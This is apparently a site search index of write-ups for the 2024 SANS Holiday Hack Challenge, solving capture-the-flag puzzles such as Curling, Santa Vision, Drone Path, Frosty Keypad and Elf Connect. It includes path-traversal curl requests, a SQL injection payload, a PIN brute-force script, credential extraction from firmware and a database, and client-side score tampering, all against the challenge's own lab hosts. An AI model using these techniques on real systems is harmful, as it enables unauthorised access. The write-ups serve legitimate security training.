a cookie. Use curl to send a request to https://curlingfun:9090/ with a cookie called “end” with the value “3”, indicating we’re on the third end of the curling match. curl --insecure --cookie \"end=3\" https://curlingfun:9090/ Assignment 5 Working with APIs and embedded devices sometimes requires working with raw HTTP headers. Use curl to view the HTTP headers returned by a request to https://curlingfun:9090/ curl --insecure --head https://curlingfun:9090/ Assignment 6 Working with APIs and embedded devices sometimes requires working with custom HTTP headers. Use curl to send a request to https://curlingfun:9090/ with an HTTP header called “Stone” and the value “Granite”. curl --insecure --header \"Stone: Granite\" https://curlingfun:9090/ Assignment 7 curl will modify your URL unless you tell it not to. For example, use curl to retrieve the following URL containing special characters: https://curlingfun:9090/../../etc/hacks curl --insecure --path-as-is \"https://curlingfun:9090/../../etc/hacks\" Last assignment Hard mode Hard mode hints and assignment is placed in a text file (HARD-MODE.txt) on disk:\nls HARD-MODE.txt HELP Assignment 1 Content is of HARD-MODE.txt is:\nPrefer to skip ahead without guidance? Use curl to craft a request meeting these requirements:\nHTTP POST request to https://curlingfun:9090/ Parameter “skip” set to “bow” Cookie “end” set to “10” Header “Hack” set to “12ft” Command to solve this assignment:\ncurl --insecure https://curlingfun:9090/ -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" Assignment 2 Excellent! Now, use curl to access this URL: https://curlingfun:9090/../../etc/button\nCommand to solve this assignment:\ncurl --insecure https://curlingfun:9090/../../etc/button -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" --path-as-is Assignment 3 Command to solve this assignment:\ncurl --insecure https://curlingfun:9090/GoodSportsmanship -X POST -d \"skip=bow\" --cookie \"end=10\" --header \"Hack: 12ft\" --path-as-is -L",
    "description": "Objective Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!\nSolution Easy mode Assignment 1 Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host “curlingfun” port 8080. If you need help, run the ‘hint’ command.",
    "tags": [],
    "title": "Curling",
    "uri": "/act1/curling/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "Welcome back to the Geese Islands! Let’s help the elves pack up to return to the North Pole.\nTalk to Jingle, Angel, and Poinsettia about their challenges.\nThis is a new chapter at the Frosty Beach\nJingle Ringford (Frosty’s Beach)\nWelcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!\nI’m Jingle Ringford, one of Santa’s many elves.\n…\nJust kidding! It’s actually the 2024 SANS Holiday Hack Challenge!\nAnd although we’re on Frosty’s Beach on Christmas Island, we’ll soon be on our way back to the North Pole.\nI thought it best to wait here for people that heard we’re on the Geese Islands but may not know we’re leaving.\nI haven’t seen Santa since we started packing up, but he always asks me to give a quick orientation to newcomers, so I’m continuing the tradition.\nBefore you head out any further onto the island, you need to accomplish two simple tasks.\nBut first, here’s a parting gift. I packed this snowball made of the magical, never-melting snow of Christmas Island. A little souvenir to take with you when we leave for the North Pole.\nClick on the snowball on your avatar. That’s where you will see your Objectives, Hints, resource links, and Conversations for the Holiday Hack Challenge.\nNow, click on the Cranberry Pi Terminal and follow the on-screen instructions.",
    "description": "Welcome back to the Geese Islands! Let’s help the elves pack up to return to the North Pole.\nTalk to Jingle, Angel, and Poinsettia about their challenges.\nThis is a new chapter at the Frosty Beach\nJingle Ringford (Frosty’s Beach)\nWelcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!\nI’m Jingle Ringford, one of Santa’s many elves.\n…\nJust kidding! It’s actually the 2024 SANS Holiday Hack Challenge!",
    "tags": [],
    "title": "Prologue",
    "uri": "/prologue/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands\nQuestion Answer",
    "description": "Objective Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands\nQuestion Answer",
    "tags": [],
    "title": "Orientation Challenge",
    "uri": "/prologue/orientation-challenge/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act3",
    "content": "Objective Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.\nHints From Hint Ribb Bonbowford jefferson is great for analyzing JFFS2 file systems. Ribb Bonbowford See if any credentials you find allow you to subscribe to any MQTT feeds. Ribb Bonbowford Consider checking any database files for credentials… In addition, there were some interesting hints in the conversation with Ribb Bonbowford:\nHi, Ribb Bonbowford here, ready to guide you through the SantaVision dilemma!\nThe Santa Broadcast Network (SBN) has been hijacked by Wombley’s goons—they’re using it to spread propaganda and recruit elves! And Alabaster joined in out of necessity. Quite the predicament, isn’t it?\nTo access this challenge, use this terminal to access your own instance of the SantaVision infrastructure.\nOnce it’s done baking, you’ll see an IP address that you’ll need to scan for listening services.\nOur target is the technology behind the SBN. We need make a key change to its configuration.\nWe’ve got to remove their ability to use their admin privileges. This is a delicate maneuver—are you ready?\nWe need to change the application so that multiple administrators are not permitted. A misstep could cause major issues, so precision is key.\nOnce that’s done, positive, cooperative images will return to the broadcast. The holiday spirit must prevail!\nThis means connecting to the network and pinpointing the right accounts. Don’t worry, we’ll get through this.\nLet’s ensure the broadcast promotes unity among the elves. They deserve to see the season’s spirit, don’t you think?\nRemember, it’s about cooperation and togetherness. Let’s restore that and bring back the holiday cheer. Best of luck!\nThe first step to unraveling this mess is gaining access to the SantaVision portal. You’ll need the right credentials to slip through the front door—what username will get you in?\nSolution Silver Santa vision A What username logs you into the SantaVision portal?\nThe very first thing I did was to portscan the given IP to learn more what my next steps should be:\nnmap -sS 34.72.28.246 -p 1-65535 These were the ports I found:\nPORT STATE SERVICE 22/tcp open ssh 25/tcp filtered smtp 1883/tcp open mqtt 5355/tcp filtered llmnr 8000/tcp open http-alt 9001/tcp open tor-orport 18290/tcp filtered unknown 48328/tcp filtered unknown Inspecting the HTML code on the landing page 34.67.56.14:8000 I found what seemed like a mqtt credential:\n\u003cdiv class=\"footer\" id=\"footer\"\u003e \u003cb\u003e©2024 Santavision Elventech Co., Ltd. Snow Rights Reserved.\u003cbr\u003e(\u003ci\u003etopic 'sitestatus'\u003c/i\u003e available.)\u003c/b\u003e \u003c/div\u003e \u003c!-- mqtt: elfanon:elfanon --\u003e \u003c/div\u003e \u003c/div\u003e \u003c!-- scripts --\u003e \u003cscript src=\"https://code.jquery.com/jquery-3.6.1.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003c!-- JavaScript Bundle with Popper --\u003e \u003cscript src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Answer:\nelfanon:elfanon Logging in:\nSanta vision B When logged in, I was greeted with this dashboard:\nOnce logged on, authenticate further without using Wombley’s or Alabaster’s accounts to see the northpolefeeds on the monitors. What username worked here?\nClicking on the “List Available Clients” button, I got this output:\nAvailable clients: 'elfmonitor', 'WomblyC', 'AlabasterS' Clicking on the “List Available Roles” button, I got this output:\nAvailable roles: 'SiteDefaultPasswordRole', 'SiteElfMonitorRole', 'SiteAlabsterSAdminRole', 'SiteWomblyCAdminRole' In order to find the answer I tried to make a connection using MQTTX, trying various combination until landing on:\nelfmonitor:SiteElfMonitorRole Turning on the monitors:\nSanta vision C Using the information available to you in the SantaVision platform, subscribe to the frostbitfeed MQTT topic. Are there any other feeds available? What is the code name for the elves’ secret operation?\nFrom Santafeed:\nTopic: santafeedQoS: 0 Sixteen elves launched operation: Idemcerybu Connect to MQTT using MQTTX:\nFinding the name of the secret operation in the “santafeed”:\nName of the secret operation:\nIdemcerybu Santa vision D There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the northpolefeeds feed. What type of contraption do you see Santa on?\nFeeds:\nfrostbitfeed northpolefeeds santafeed Send as Plaintext to Santafeed using the Html form:\nsingleAdminMode=true\u0026role=SiteElfMonitorRole\u0026user=WombleyC Answer:\npogo stick Gold Santa vision A What username logs you into the SantaVision portal?\nI found a new topic by using BurpSuite navigating to the logon form site:\nsitestatus By listening in on the logon process using BurpSuite I found a direct link for login:\n\u003cp\u003eYou should be redirected automatically to the target URL: \u003ca href=\"/auth?id=viewer\u0026amp;loginName=elfanon\"\u003e/auth?id=viewer\u0026amp;loginName=elfanon\u003c/a\u003e. If not, click the link. Investigating further on the sitestatus feed I found an interesting download:\n/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin On Kali, downloaded the file:\nwget http://34.72.28.246:8000/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin Investigating what it is:\nfile applicationDefault.bin applicationDefault.bin: Linux jffs2 filesystem data little endian According to the hints, we can use Jefferson to treat this file (including here the instruction setting it up):\npython3 -m venv env source env/bin/activate pip install -U pip pip install jefferson Using Jefferson, extracting results to folder “out”:\njefferson -d out applicationDefault.bin In file out/app/src/accounts/views.py I found a reference to a SQLite database:\n@accounts_bp.route(\"/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin\", methods=[\"GET\"]) def firmware(): return send_from_directory(\"static\", \"sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin\", as_attachment=True) @accounts_bp.route(\"/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite\", methods=[\"GET\"]) def db(): return send_from_directory(\"static\", \"sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite\", as_attachment=True) Downloading the SQLite database:\nwget http://34.72.28.246:8000/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite Opened it up in sqlitebrowser and found a user table:\nThe credentials for gold in A is:\nsantaSiteAdmin:S4n+4sr3411yC00Lp455wd I also found a reference to another user in the codebase:\ncore/views.py:54: mqttPublish.single(\"$CONTROL/dynamic-security/v1\",\"{\\\"commands\\\":[{\\\"command\\\": \\\"deleteClient\\\",\\\"username\\\": \\\"\"+name+\"\\\"}]}\",hostname=\"localhost\",port=1883,auth={'username':\"SantaBrokerAdmin\", 'password':\"8r0k3R4d1mp455wD\"}) Santa vision B Once logged on, authenticate further without using Wombley’s or Alabaster’s accounts to see the northpolefeeds on the monitors. What username worked here?\nWhile inspecting the HTTPS headers for the monitoring GUI, I found something interesting for call\nhttp://34.30.225.171:8000/auth?id=viewer\u0026loginName=santaSiteAdmin It appears that there’s some credentials hidden in the response headers:\nFound:\nsantashelper2024:playerSantaHelperPass7183926777 Note: the password changes whenever the environment is reset …\nSanta vision C Using the information available to you in the SantaVision platform, subscribe to the frostbitfeed MQTT topic. Are there any other feeds available? What is the code name for the elves’ secret operation?\nTaking the answer for Silver C, “Idemcerybu” I asked ChatGPT what on earth this could be. It answered it was most likely ROT13. So I asked it to loop through every positions, ending up with a shift of 11.\nAnswer: Snowmobile\nSanta vision D There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the northpolefeeds feed. What type of contraption do you see Santa on?\nAnwer: Hovercraft\nIn order to solve this I had to send the same message as in Silver D, but by using a client instead of the website:\nBy obsering the monitors I now see what kind of vehicle santa is using:",
    "description": "Objective Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.\nHints From Hint Ribb Bonbowford jefferson is great for analyzing JFFS2 file systems. Ribb Bonbowford See if any credentials you find allow you to subscribe to any MQTT feeds. Ribb Bonbowford Consider checking any database files for credentials… In addition, there were some interesting hints in the conversation with Ribb Bonbowford:",
    "tags": [],
    "title": "Santa Vision",
    "uri": "/act3/santa-vision/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Objective Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.\nSolution Silver From the hamburger menu I accesses “FileShare” and got this landing page, where I could download a fritjolf-Path.kml file:\nOpening this .kml file in Google Earth, it opens up and shows a phrase:\nGUMDROP1 By looking at these two things I have just discovered, there is something strange going on. Why is it a name in the filename? And could this GUMDROP1 string be a password. Trying my luck using it as login credentials:\nSnooping around, I found a downloadable CSV file in the profile section:\nBy the look of it, it appears to be some an export of KML. Trying to convert it into CSV by using https://www.convertcsv.com/csv-to-kml.htm:\nOpening the export up in Google Earth:\nBy zooming in I saw structures resembling letters:\nMaking notes of each “letter” in Excel I found:\nFound what is most likely a drone name: ELF-HAWK. Went back to the web app and searched for the drone, got this:\nYet another CSV. Converted it to KML by the same way as earlier. Opened it in https://kmzview.com/, appears that the positions may indicate some text of some sorts:\nTried to find alternative ways of rendering the positions from this list: https://gislayer.medium.com/online-web-based-kml-kmz-viewers-1954c33a9a53. Ended up with this:\nDroneDataAnalystExpertMedal Heading back into the web app, I submitted this password from the “Admin Console” endpoint:\nGold Chimney Scissorsticks gives us a hint for Gold:\nBut I need you to dig deeper. Make sure you’re checking those file structures carefully, and remember—rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!\nSolution The hint hints at looking at the the various calls, and for each call I had a look at what could possibly be affected by an injection flaw. I came up with this candidate:\nEndpoint takes in drone name as GET parameter:\nhttps://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=test By testing using this statement, I provoked an error: https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK'\nThe error message looks like this:\nBy this I had found an SQL Injection fault - which I then exploited by:\nRaw: https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK' or '1'='1 Urlencoded: https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK%27%20or%20%271%27=%271 This enabled me to retrieve this list:\n[ { \"name\": \"ELF-HAWK\", \"quantity\": \"40\", \"weapons\": \"Snowball-launcher\" }, { \"name\": \"Pigeon-Lookalike-v4\", \"quantity\": \"20\", \"weapons\": \"Surveillance Camera\" }, { \"name\": \"FlyingZoomer\", \"quantity\": \"4\", \"weapons\": \"Snowball-Dropper\" }, { \"name\": \"Zapper\", \"quantity\": \"5\", \"weapons\": \"CarrotSpike\" } ] For each of these I passed their name through the endpoint:\nhttps://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone= For drone “Pigeon-Lookalike-v4” I got the following hint:\nThere is something interesting by this hint:\nI heard a rumor that there is something fishing with some of the files. There was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it.\nWe’ve downloaded a bunch of CSV files during this task, so I’ll simply look into the files again in reverse - starting with the latest. The words TRUE and FALSE are highlighted, so I suppose these means boolean.\nThis Python script does the following:\nOpen the “ELF-HAWK-dump.csv” in Pandas, ensuring everyting is loaded as strings Removes all columns having not having text “TRUE” or “FALSE” Removed all rows having just “FALSE” values Replaces text “TRUE” with 1, and “FALSE” with 0 Writes the data to a text file import pandas as pd df = pd.read_csv(\"ELF-HAWK-dump.csv\", dtype=str) df = df.loc[:, df.applymap(lambda x: x in ['TRUE', 'FALSE']).all()] df = df[~df.apply(lambda row: (row == 'FALSE').all(), axis=1)] df = df.replace({'TRUE': '1', 'FALSE': '0'}) with open(\"outdata\", 'w') as f: for _, row in df.iterrows(): row_values = ''.join(str(value) for value in row) f.write(row_values) In order to solve this riddle I took the output and opened it in Cyberchef like so:\nI could not find anything interesting - then it dawned on me. Lets pad it in front with “00” (on a whim):\nThe code word is:\nEXPERTTURKEYCARVERMEDAL Then submitting the code word:",
    "description": "Objective Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.\nSolution Silver From the hamburger menu I accesses “FileShare” and got this landing page, where I could download a fritjolf-Path.kml file:\nOpening this .kml file in Google Earth, it opens up and shows a phrase:\nGUMDROP1 By looking at these two things I have just discovered, there is something strange going on.",
    "tags": [],
    "title": "Drone Path",
    "uri": "/act2/drone-path/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "With Santa away, Wombley Cube and Alabaster Snowball have each tried to lead. Surely they won’t mess up the naughty and nice list…\nHelp Bow, Morcel, and Jewell solve their challenges.\nThis division among the elves can’t be good. Surely it won’t get any worse.",
    "description": "With Santa away, Wombley Cube and Alabaster Snowball have each tried to lead. Surely they won’t mess up the naughty and nice list…\nHelp Bow, Morcel, and Jewell solve their challenges.\nThis division among the elves can’t be good. Surely it won’t get any worse.",
    "tags": [],
    "title": "Act1",
    "uri": "/act1/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective In a swirl of shredded paper, lies the key. Can you unlock the shredder’s code and uncover Santa’s lost secrets?\nHints UV light Numbers found from lighting at the keypad using the UV light:\n[ 2, 6, 7, 8 ] Hint from the book This is the hint we get:\nThinking about it, it appears to correpond to\npage:word:letter Using this formula I got:\nSequence From book 2:6:1 S 4:19:3 A 6:1:1 N 3:10:4 T 14:8:3 A Somehow I got “SANTA”. After much thoughtwork I came up with a scheme on how I can use this word - let’s look at it with some Regex filter spectacles:\nPosition Letter Pattern 1 S Pos 1 should not be same as pos. 5 2 A Pos 2 should be the same as pos. 5 3 N Pos 3 should not be the same as pos, 1, 2, 4, 5 4 T Pos 4 should not be the same as post 1, 2, 3, 5 5 A Pos 5 should be the same as pos. 2 Solution Silver solution Bruteforcer Given the filter outlined under “Hint from the book”, I created the following Python script to calcualte permutations and apply the filter scheme. I picked up the the remote URL and POST format from a BurpSuite session. The script:\nimport requests, itertools, time for perm in [''.join(p) for p in itertools.product(['2', '6', '7', '8'], repeat=5)]: if perm[0] is not perm[-1] and perm[1] == perm[-1]: if (perm[0] not in list(set(perm[2:4]))) and (perm[1] not in list(set(perm[2:4]))) and len(list(set(perm[2:4]))) \u003e 1: res = requests.post( \"https://hhc24-frostykeypad.holidayhackchallenge.com/submit\", json = { \"answer\": perm } ) if res.status_code != 400: print(perm) break else: time.sleep(1) After just a couple of seconds, it produced the correct pin code:\n72682 As evident here, the pincode got accepted:\nGold solution There’s a second pincode to be found that doesn’t fit the tips already given. Time to modify the above script and bruteforce the solution:\nimport requests, itertools, time for perm in [''.join(p) for p in itertools.product(['2', '6', '7', '8'], repeat=5)]: print(f\"trying '{perm}' ... \", end=\"\") res = requests.post( \"https://hhc24-frostykeypad.holidayhackchallenge.com/submit\", json = { \"answer\": perm } ) if res.status_code != 400: print(f\"{res.status_code} - {res.json()} - {perm}\") else: print(\" Negative\") time.sleep(1) This script found the other pincode within seconds: 22786",
    "description": "Objective In a swirl of shredded paper, lies the key. Can you unlock the shredder’s code and uncover Santa’s lost secrets?\nHints UV light Numbers found from lighting at the keypad using the UV light:\n[ 2, 6, 7, 8 ] Hint from the book This is the hint we get:\nThinking about it, it appears to correpond to\npage:word:letter Using this formula I got:\nSequence From book 2:6:1 S 4:19:3 A 6:1:1 N 3:10:4 T 14:8:3 A Somehow I got “SANTA”.",
    "tags": [],
    "title": "Frosty Keypad",
    "uri": "/act1/frosty-keypad/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Help Angel Candysalt connect the dots in a game of connections.\nObservations # Observation 1 Inspected network traffic, game is hosted at https://hhc24-elfconnect.holidayhackchallenge.com/ 2 Playing game through Burpsuite we can get hold of the Javascript controlling the game 3 In Javascript, variable “wordSets” holds the words 4 In Javascript, variable “correctSets” holds the correct words for each round 5 Round is controlled by https://hhc24-elfconnect.holidayhackchallenge.com/?round=2 6 It appears that “correctSets” isn’t updated between rounds. Thus, the same positions pr. set is reused. 7 In Javascript, if we set variable “score” to a high number, it reflects in the GUI. 8 We need to set “id” in local storage to beat this game if we load the game in a new window or tab, as evident in code localStorage.getItem('id'); Solution Silver means playing the game using this cheat sheet:\nHere’s the organized table with all groups:\nRound 1 Category Items Reindeer Team Blitzen, Comet, Prancer, Vixen Christmas Decorations Lights, Garland, Tinsel, Star Holiday Songs/Singers Crosby, White Christmas, Jingle Bells, Belafonte Santa’s Equipment Sleigh, Bag, Mittens, Gifts Round 2 Category Items Network Analysis Tools Nmap, Wireshark, netcat, Nessus Mobile/Binary Analysis Frida, apktool, Cycript, AppMon Web Application Testing burp, OWASP zap, Nikto, wfuzz Post-Exploitation/Red Team Metasploit, Empire, Cobalt Strike, HAVOC Round 3 Category Items Historical/Classical Ciphers Caesar, Scytale, One-time Pad, Ottendorf Modern Symmetric Algorithms AES, Blowfish, 3DES, RSA Wireless Security Protocols WPA2, WEP, TKIP, LEAP General Crypto Concepts Symmetric, Asymmetric, hash, hybrid Round 4 Category Items Layer 2 (Data Link) Protocols ARP, Ethernet, PPP, IEEE 802.11 Layer 3 (Network) Protocols IP, ICMP, IGMP, IPX Secure Communication Protocols SSH, SSL, TLS, IPSec Application Layer Protocols HTTP, FTP, SMTP, DNS Gold Based on the observation, this appears to be a straight and easy task to solve. Since we found the Javascript controlling the game, and observing what it does, we can create a short and sweet Javascript that simply loops through each sets in wordSets and maps it to the corresponding solution in correctSets. We also make sure to bump the topscore by simply setting it to a huge number to beat this game with gold.\nfunction mapWordsByCorrectSets(wordSets, correctSets) { let result = {}; for (let setKey in wordSets) { result[setKey] = correctSets.map(indices =\u003e indices.map(i =\u003e wordSets[setKey][i]) ); } return result; } score = 10000000000000; console.log(mapWordsByCorrectSets(wordSets, correctSets)); Applying code Selecting the right iframe we are going to work in:\nPasting and running the Javascript code:\nThen it is just a matter of selecting the first word set from the GUI and you have beaten the game with a new high score!\nJavascript controlling the game let urlParams = new URLSearchParams(window.location.search); const roundCheck = urlParams.get('round'); if (!roundCheck) { // If 'round' is absent or has no value sessionStorage.clear(); } // Configuring the Phaser game const config = { type: Phaser.AUTO, scale: { // sets the auto scaling of the canvas for all browsers mode: Phaser.Scale.FIT, parent: 'phaser-example', autoCenter: Phaser.Scale.CENTER_BOTH, width: 800, height: 600 }, backgroundColor: '#2fb3fe', // background border color scene: { preload: preload, create: create, update: update }, physics: { default: 'arcade', //defines game as an arcade type arcade: { gravity: { y: 0 }, debug: false } } }; const game = new Phaser.Game(config); const wordSets = { 1: [\"Tinsel\", \"Sleigh\", \"Belafonte\", \"Bag\", \"Comet\", \"Garland\", \"Jingle Bells\", \"Mittens\", \"Vixen\", \"Gifts\", \"Star\", \"Crosby\", \"White Christmas\", \"Prancer\", \"Lights\", \"Blitzen\"], 2: [\"Nmap\", \"burp\", \"Frida\", \"OWASP Zap\", \"Metasploit\", \"netcat\", \"Cycript\", \"Nikto\", \"Cobalt Strike\", \"wfuzz\", \"Wireshark\", \"AppMon\", \"apktool\", \"HAVOC\", \"Nessus\", \"Empire\"], 3: [\"AES\", \"WEP\", \"Symmetric\", \"WPA2\", \"Caesar\", \"RSA\", \"Asymmetric\", \"TKIP\", \"One-time Pad\", \"LEAP\", \"Blowfish\", \"hash\", \"hybrid\", \"Ottendorf\", \"3DES\", \"Scytale\"], 4: [\"IGMP\", \"TLS\", \"Ethernet\", \"SSL\", \"HTTP\", \"IPX\", \"PPP\", \"IPSec\", \"FTP\", \"SSH\", \"IP\", \"IEEE 802.11\", \"ARP\", \"SMTP\", \"ICMP\", \"DNS\"] }; let wordBoxes = []; let selectedBoxes = []; let correctSets = [ [0, 5, 10, 14], // Set 1 [1, 3, 7, 9], // Set 2 [2, 6, 11, 12], // Set 3 [4, 8, 13, 15] // Set 4 ]; let completedSets = []; let shuffledIndices = []; let emitter; let successText; let successBackground; let mainScene; let score = parseInt(sessionStorage.getItem('score') || '0'); // Initialize score let scoreText; // Text object for score display let highScore = 50000; let highScoreText; // text object for high score let roundComplete = sessionStorage.getItem('roundComplete'); if (roundComplete == null) { roundComplete = 0; } // let urlParams = new URLSearchParams(window.location.search); let round = parseInt(urlParams.get('round') ?? 1, 10); // Default to round 1 if no parameter is set let words = wordSets[round]; document.addEventListener(\"DOMContentLoaded\", function() { setTimeout(function() { const urlParams = new URLSearchParams(window.location.search); const id = urlParams.get('id'); // Regular expression to validate a UUID v4 const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i; // Check if the id parameter exists and is a valid UUID v4 if (id \u0026\u0026 uuidV4Regex.test(id)) { localStorage.setItem('id', id); } else { let id = localStorage.getItem('id'); if (!id) { alert('Invalid id provided in the URL. Please provide a valid ID in order to get completion if you beat this challenge.'); } } if (!round) { urlParams.set('round', roundComplete++); window.location.href = `${window.location.origin}${window.location.pathname}?${urlParams.toString()}`; } }, 250); }); const gridCols = 4; const gridRows = 4; const boxWidth = 180; const boxHeight = 120; const gridXOffset = 50; const gridYOffset = 50; function preload() { this.load.image('flares', \"/static/images/candyCane.png\"); this.load.image('overlay', \"/static/images/background.webp\"); this.load.image('landing', \"/static/images/landing.png\"); this.load.audio('bzzzt', '/static/audio/bzzzt.wav'); //this.sound.play('bzzzt'); this.load.audio('click', '/static/audio/click.wav'); //this.sound.play('click'); this.load.audio('ding', '/static/audio/ding.wav'); //this.sound.play('ding'); this.load.audio('horaay', '/static/audio/horaay.wav'); //this.sound.play('horaay'); console.log(\"Static files loaded\"); } function create() { //console.log('round ' + roundComplete); //console.log('score ' + score); mainScene = this; var overlay = this.add.image(400, 300, 'overlay').setDepth(0).setOrigin(0.5, 0.5); overlay.setScale(0.5); // Add title text (centered horizontally and aligned with the score's y-position) titleText = this.add.text(400, 15, 'Elf Connect', { fontSize: '30px', fill: '#000', // Black color for the title align: 'center' }); titleText.setOrigin(0.5, 0); // Center the title horizontally on the x-axis if (roundComplete == 0) { var landing = this.add.image(400, 250, 'landing').setScale(.6).setDepth(2).setOrigin(0.5, 0.5).setInteractive(); mainScene.input.once('pointerdown', function () { landing.destroy(); }) } shuffledIndices = Phaser.Utils.Array.Shuffle([...Array(16).keys()]); for (let i = 0; i \u003c 16; i++) { let col = i % gridCols; let row = Math.floor(i / gridCols); let xPos = gridXOffset + col * boxWidth; let yPos = gridYOffset + row * boxHeight; let box = this.add.text(xPos, yPos, words[shuffledIndices[i]], { fontSize: '20px', //backgroundColor: '#0a7e28', // card color unselected backgroundColor: '#10ca40', // card color unselected color: '#000000', //text color for cards padding: { top: 20, left: 10, right: 10, bottom: 20 }, align: 'center', fixedWidth: boxWidth - 20, fixedHeight: boxHeight - 20, wordWrap: { width: boxWidth - 40, useAdvancedWrap: true } }).setInteractive(); box.index = shuffledIndices[i]; box.selected = false; box.gridPos = i; box.on('pointerdown', function () { if (!this.selected) { this.setStyle({ backgroundColor: '#edbb99' }); // card color selected this.selected = true; selectedBoxes.push(this); } else { //this.setStyle({ backgroundColor: '#0a7e28' }); // card color unselected this.setStyle({ backgroundColor: '#10ca40' }); // card color unselected this.selected = false; selectedBoxes = selectedBoxes.filter(box =\u003e box !== this); } if (selectedBoxes.length === 4) { checkSelectedSet(this.scene); } else { mainScene.sound.play('click'); } }); wordBoxes.push(box); } emitter = this.add.particles(400, 250, 'flares', { lifespan: 4000, speed: { min: 150, max: 250 }, scale: { start: 0.8, end: 0 }, gravityY: 150, blendMode: 'ADD', emitting: false }); // Add scoreboard text scoreText = this.add.text(600, 20, 'Score: ' + score, { fontSize: '20px', fill: '#000000' }); highScoreText = this.add.text(20, 20, 'High Score: 50000', { fontSize: '20px', fill: '#000' }); } function update() { // Nothing needed in the update loop for this simple game } function checkSelectedSet(scene) { let selectedIndices = selectedBoxes.map(box =\u003e box.index); selectedIndices.sort((a, b) =\u003e a - b); let isCorrectSet = false; let matchedSetIndex = -1; for (let i = 0; i \u003c correctSets.length; i++) { if (JSON.stringify(selectedIndices) === JSON.stringify(correctSets[i])) { isCorrectSet = true; matchedSetIndex = i; break; } } if (isCorrectSet) { completedSets.push(matchedSetIndex); positionCompletedSets(); disableCompletedSet(matchedSetIndex); // Disable interaction on the completed set shuffleRemainingRows(); // Update score by 100 points score += 100; scoreText.setText('Score: ' + score); // Add high-score board if (score \u003e 50000) { highScoreText.setText('High Score: ' + score); emitter.explode(20); submitAction(2); displaySuccessMessage('Great Job Hacker! Elf Connect Complete and Hacked!', function () { }); } // If all sets are completed, trigger the fireworks effect if (completedSets.length === 4) { roundComplete++; scene.sound.play('horaay'); gameStatus(); } else { scene.sound.play('ding'); } } else { selectedBoxes.forEach(box =\u003e { //box.setStyle({ backgroundColor: '#0a7e28' }); // card color unselected original box.setStyle({ backgroundColor: '#10ca40' }); // card color unselected box.selected = false; }); scene.sound.play('bzzzt'); } selectedBoxes = []; } function disableCompletedSet(setIndex) { correctSets[setIndex].forEach((wordIndex) =\u003e { let box = wordBoxes.find(box =\u003e box.index === wordIndex); if (box) { box.disableInteractive(); // Disable interaction on the box } }); } function positionCompletedSets() { completedSets.forEach((setIndex, completedRowIndex) =\u003e { let yPos = gridYOffset + completedRowIndex * boxHeight; correctSets[setIndex].forEach((wordIndex, boxIndex) =\u003e { let box = wordBoxes.find(box =\u003e box.index === wordIndex); let xPos = gridXOffset + boxIndex * boxWidth; box.setStyle({ backgroundColor: '#126079', // completed row color color: '#fff' //text color completed row cards }); box.setPosition(xPos, yPos); }); }); } function shuffleRemainingRows() { let remainingBoxes = wordBoxes.filter(box =\u003e !completedSets.includes(correctSets.findIndex(set =\u003e set.includes(box.index)))); let shuffledIndices = Phaser.Utils.Array.Shuffle(remainingBoxes.map(box =\u003e box.index)); remainingBoxes.forEach((box, i) =\u003e { let remainingRowIndex = Math.floor(i / gridCols) + completedSets.length; let colIndex = i % gridCols; let xPos = gridXOffset + colIndex * boxWidth; let yPos = gridYOffset + remainingRowIndex * boxHeight; box.index = shuffledIndices[i]; box.setText(words[shuffledIndices[i]]); box.setPosition(xPos, yPos); //box.setStyle({ backgroundColor: '#0a7e28' }); // unselected card color box.setStyle({ backgroundColor: '#10ca40' }); // unselected card color }); } function gameStatus() { //console.log(roundComplete); if (roundComplete \u003c 4) { emitter.explode(20); 